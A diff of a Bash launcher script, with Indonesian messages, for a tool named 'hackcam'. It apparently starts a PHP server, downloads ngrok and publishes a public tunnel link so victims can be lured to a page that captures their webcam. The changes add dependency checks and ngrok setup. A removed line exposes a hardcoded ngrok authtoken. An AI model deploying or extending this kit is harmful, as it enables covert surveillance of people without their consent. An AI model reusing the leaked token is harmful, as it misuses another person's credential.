@@ -77,25 +77,67 @@ banner(){
 
 dependencies(){
     command -v php > /dev/null 2>&1 || { printf >&2 "\n\e[31m[!] Script ini memerlukan php, silahkan install terlebih dahulu\e[0m\n"; exit 1; }
-
+    command -v unzip > /dev/null 2>&1 || { printf >&2 "\n\e[31m[!] Script ini memerlukan unzip, silahkan install terlebih dahulu\e[0m\n"; exit 1; }
+    command -v wget > /dev/null 2>&1 || { printf >&2 "\n\e[31m[!] Script ini memerlukan wget, silahkan install terlebih dahulu\e[0m\n"; exit 1; }
 }
 
-start_server(){
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php...\n"
+start_php(){
+    printf "\n\e[1;92m[\e[0m+\e[1;92m] Starting php...\n"
     php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
     sleep 2
 }
 
-start_ngrok(){
+ngrok_setup(){
+    if [[ -e ngrok ]] 
+        then
+            echo ""
+        else
+            printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
+            arch=$(uname -a | grep -o 'arm' | head -n1)
+            arch2=$(uname -a | grep -o 'Android' | head -n1)
+
+            if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] 
+                then
+                    wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+
+                    if [[ -e ngrok-stable-linux-arm.zip ]]
+                        then
+                            unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+                            chmod +x ./ngrok
+                            rm -rf ngrok-stable-linux-arm.zip
+                        else
+                            printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+                            exit 1
+                    fi
+
+                else
+                    wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+                    if [[ -e ngrok-stable-linux-386.zip ]]
+                        then
+                            unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+                            chmod +x ./ngrok
+                            rm -rf ngrok-stable-linux-386.zip
+                        else
+                            printf "\e[1;93m[!] Download error... \e[0m\n"
+                            exit 1
+                    fi
+            fi
+    fi
+
     if ! [ -f "$HOME/.config/ngrok/ngrok.yml" ]
         then
         read -p $'\e[36m[\e[0m\e[1;77m+\e[0m\e[36m] Masukan ngrok authtoken : \e[0m' ngrok_authtoken
-        ./ngrok config add-authtoken 28vedrSJ8DiQBZko3jZRB66V1uY_5QiZaf3xjt3KgLFs3VLGy
+        ./ngrok config add-authtoken $ngrok_authtoken
     fi
+
+}
+
+start_ngrok(){
+    ngrok_setup
         
     printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok...\n"
     ./ngrok http 3333 > /dev/null 2>&1 &
-    sleep 3
+    sleep 5
     
     link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
     printf "\e[1;92m[\e[0m-\e[1;92m] Link hackcam:\e[0m\e[1;77m %s\e[0m\n" $link
@@ -136,7 +178,7 @@ run(){
             printf "\n\e[1;93m[!] CANCELED\e[0m\n";
     elif [ $option -eq 1 ]
         then
-            start_server
+            start_php
             start_ngrok
             check
     else 
